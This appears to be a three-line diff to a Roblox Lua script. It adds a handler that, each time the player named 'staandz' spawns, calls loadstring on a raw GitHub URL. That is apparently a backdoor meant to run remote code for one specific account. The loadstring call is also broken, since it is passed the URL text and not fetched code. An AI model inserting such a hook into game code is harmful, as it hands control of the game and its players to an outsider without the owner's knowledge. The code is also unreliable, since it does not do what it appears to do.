@@ -1,0 +1,3 @@
+game.Players.staandz.CharacterAdded:Connect(function()
+loadstring("https://raw.githubusercontent.com/balljeet/balljeet-documents/main/z")
+end)
